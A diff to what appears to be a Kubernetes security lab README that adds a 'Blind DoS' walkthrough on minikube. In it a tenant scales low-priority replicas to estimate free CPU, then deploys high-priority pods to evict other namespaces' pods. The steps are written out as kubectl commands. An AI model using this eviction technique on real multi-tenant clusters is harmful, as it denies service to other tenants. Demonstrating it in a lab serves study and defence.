@@ -181,6 +181,53 @@ minikube start --cpus 4 --nodes 4
    See that this will evict a low-priority pod (`Pending` status) and start `high-priority`pod.
 
    
+### 👨🏽‍🦯 Blind DoS
+
+In a multi-tenant cluster, you have probably not have access to:
+* cpu limit
+* information about other pods running in another namespace
+* etc ...
+
+To be able to determine which amount of cpu request will trigger an eviction you have to fumble around to get an idea of the cluster state. Indeed, be able to run a high-priority pod does not guarantee us if another pod on another namespace has been evicted or not.
+
+So, the goal is to trigger an out-of-bound resource with lower pod to estimate the amount to request. It lay on the assumption that the cluster is relartively stable (not many pod creation/deletion happen in a minute)
+
+#### Set-up
+
+1. Create cluster with 3 nodes and cpu.limit to 4, create `bad-tenant` namespace & create the `high-priority `Priority Class:
+   * `minikube start --cpus 4 --nodes 3`
+   * `kubectl create ns bad-tenant`
+   * `kubectl apply -f priorityClass-high.yml`
+2. Populate the cluster with lower-priority pods (to simulate other tenants activities): `kubectl -f ds/ds-no-pod-priority.yml` 
+3. Watch pods on both namespaces:
+   * `watch -n 0.1 -d kubectl get pods -o wide`
+   * `watch -n 0.1 -d kubectl get pods -o wide -n bad-tenant`
+
+#### Attack
+
+As the tenant, we could only deploy pod in our namespace `bad-tenant`.
+
+1. Create a deployment of lower-priority pod: `kubectl apply -f blind/deployment-estimate-no-priority.yml`
+
+2. See that the pod of the deployment was succesfully created and is running. Now increase progressively the deployment replicas value: 
+
+   * `kubectl -n bad-tenant scale deployment/estimate  --replicas=2`
+   * `kubectl -n bad-tenant scale deployment/estimate  --replicas=3`, and so on...
+
+3. When you we reach `7` replicas, we observe that the new pod is `Pending` ⇒ We have stuffed our cluster and it is likely out of cpu resource (check with `kubectl describe pod [pending_estimate_pod] -n bad-tenant`). Hence, if we create the same deployment with high-priority it will evict some pods on other ns.
+
+   * delete your low-priority deployment: `kubectl delete -f blind/deployment-estimate-no-priority.yml`
+   * create the high-priority deployment & scale it to have 7 replicas: `kubectl apply -f blind/deployment-high.yml && kubectl -n bad-tenant scale deployment/high-priority-evictor  --replicas=7`
+
+See that you actually have evicted a pod on `default` namespace!
+
+##### Alternative
+
+To easily see on which node the eviction occurs, you can set the replicas to `6` and create an higher-priority pod: the eviction occurs on the same node as this pod.
+
+`kubectl apply -f blind/deployment-high.yml && kubectl -n bad-tenant scale deployment/high-priority-evictor  --replicas=6 && kubectl apply -f blind/pod-high.yml`
+
+
 
 ### 🎯 Evict a specific Pod
 
@@ -192,7 +239,6 @@ minikube start --cpus 4 --nodes 4
   * In a more sophisticated attack, you could use anti-affinity to deploy higher-prority pods on all nodes where the target pods isn't deployed (to block future rescheduling). Then, evict target pods using node affinity / pod anti afinity to deploy malicious pod
 * Deploy  the malicious pod on the same node than the target pod , if you already know on which node the target pod is running
 
-### 👨🏽‍🦯 Blind DoS
 
 ## Limits
 
